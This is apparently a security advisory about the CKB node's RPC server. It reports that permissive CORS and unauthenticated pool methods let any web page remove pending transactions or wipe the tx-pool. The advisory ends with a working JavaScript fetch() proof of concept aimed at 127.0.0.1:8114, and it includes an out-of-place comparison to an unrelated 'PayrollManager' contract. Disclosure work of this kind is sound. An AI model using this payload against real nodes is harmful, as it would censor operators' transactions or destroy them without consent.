### Title
Unauthenticated `remove_transaction` / `clear_tx_pool` RPC Methods Allow Any Web Origin to Censor or Wipe the Local Tx-Pool via Permissive CORS — (`File: rpc/src/module/pool.rs`, `rpc/src/server.rs`)

---

### Summary

The CKB RPC server applies `CorsLayer::permissive()` globally, setting `Access-Control-Allow-Origin: *` on every response. The Pool module's `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` methods perform no caller authentication and no ownership verification. Any web page visited by a node operator can therefore make cross-origin HTTP POST requests to `http://127.0.0.1:8114` and silently remove any specific pending transaction — or wipe the entire pool — without the operator's knowledge or consent.

---

### Finding Description

**`CorsLayer::permissive()` applied unconditionally to the RPC server**

In `rpc/src/server.rs`, the Axum router is built with a permissive CORS layer that allows any origin:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    ...
    .layer(CorsLayer::permissive())   // Access-Control-Allow-Origin: *
    ...
``` [1](#0-0) 

`CorsLayer::permissive()` from `tower-http` sets `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Methods: *`, and `Access-Control-Allow-Headers: *`. This instructs browsers to allow cross-origin requests from **any** web page to the RPC endpoint.

**`remove_transaction` has no authentication or ownership check**

The Pool RPC trait declares:

```rust
#[rpc(name = "remove_transaction")]
fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
``` [2](#0-1) 

The implementation forwards the call directly to the tx-pool service with no caller identity check, no signature verification, and no check that the caller is the original submitter of the transaction:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| { ... })
}
``` [3](#0-2) 

The underlying `remove_tx` in the tx-pool service removes the transaction from the verify queue, orphan pool, and main pool unconditionally:

```rust
pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
    let id = ProposalShortId::from_tx_hash(&tx_hash);
    { let mut queue = self.verify_queue.write().await;
      if queue.remove_tx(&id).is_some() { return true; } }
    { let mut orphan = self.orphan.write().await;
      if orphan.remove_orphan_tx(&id).is_some() { return true; } }
    let mut tx_pool = self.tx_pool.write().await;
    tx_pool.remove_tx(&id)
}
``` [4](#0-3) 

**`clear_tx_pool` and `clear_tx_verify_queue` are equally unprotected**

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_pool(snapshot).map_err(...)?;
    Ok(())
}

fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_verify_queue().map_err(...)?;
    Ok(())
}
``` [5](#0-4) 

These methods wipe the entire pool or verify queue with no authentication whatsoever.

**Default configuration binds to localhost, but CORS makes it reachable from any web page**

The default `listen_address` is `127.0.0.1:8114`: [6](#0-5) 

While this prevents direct external TCP connections, `CorsLayer::permissive()` means a browser will honor cross-origin requests from any web page to `http://127.0.0.1:8114`. The Pool module is enabled by default in the standard modules list: [7](#0-6) 

There is no authentication layer anywhere in the RPC server or Pool module implementation. [8](#0-7) 

---

### Impact Explanation

An attacker who can get a CKB node operator to visit a malicious web page can:

1. **Selectively censor specific transactions**: Call `remove_transaction` with a known `tx_hash` to evict a target transaction from the local node's pool before it is proposed or committed. The transaction hash is public (visible via `get_raw_tx_pool`). This can delay or prevent time-sensitive transactions (e.g., DAO withdrawals, contract interactions) from being included in blocks by the local node.

2. **Wipe the entire local pool**: Call `clear_tx_pool` to remove all pending and proposed transactions from the node's pool, causing the operator to lose all unconfirmed transactions they were tracking or relaying.

3. **Wipe the verify queue**: Call `clear_tx_verify_queue` to drop all transactions currently being verified, stalling the node's transaction processing pipeline.

The impact is local to the node (transactions may still exist in other nodes' pools), but for a node operator who is also a transaction submitter or service provider, this constitutes unauthorized state manipulation of their node's mempool — a direct analog to the PayrollManager's missing nonce invalidation access control, where the inverse problem exists: here, the *cancellation* operation lacks access control rather than being absent.

---

### Likelihood Explanation

- The attack requires the node operator to visit a malicious web page in a browser on the same machine running the CKB node. This is a realistic scenario for developers and node operators who commonly use the same workstation for both.
- The `Pool` module is enabled by default in the standard configuration.
- `CorsLayer::permissive()` is hardcoded in the server — it is not configurable and cannot be disabled by the operator.
- Transaction hashes of pending transactions are publicly enumerable via `get_raw_tx_pool`, so an attacker can target specific transactions.
- No user interaction beyond visiting a web page is required; the attack can be executed silently via JavaScript `fetch()`.

---

### Recommendation

1. **Remove or restrict `CorsLayer::permissive()`**: Replace with a strict CORS policy that only allows `null` origin (same-origin) or a configurable allowlist. At minimum, do not allow `*` for state-mutating POST endpoints.

2. **Add authentication to destructive Pool RPC methods**: `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` should require a configurable API token or be restricted to a separate, non-browser-accessible interface (e.g., a Unix domain socket).

3. **Separate read-only and write RPC endpoints**: Expose destructive pool management methods on a separate port or socket that is not subject to browser-reachable CORS policies.

---

### Proof of Concept

A malicious web page served from any origin can execute the following JavaScript when visited by a CKB node operator:

```javascript
// Remove a specific pending transaction from the local node's pool
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    id: 1,
    jsonrpc: "2.0",
    method: "remove_transaction",
    params: ["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"]
  })
}).then(r => r.json()).then(console.log);

// Or wipe the entire pool
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ id: 2, jsonrpc: "2.0", method: "clear_tx_pool", params: [] })
}).then(r => r.json()).then(console.log);
```

Because `CorsLayer::permissive()` sets `Access-Control-Allow-Origin: *`, the browser will not block these cross-origin requests. The server will process them and return `{"result": true}` / `{"result": null}` respectively, confirming the transactions were removed.

The attacker can first enumerate all pending transaction hashes via `get_raw_tx_pool` (also unauthenticated and CORS-accessible), then selectively target specific transactions for removal.
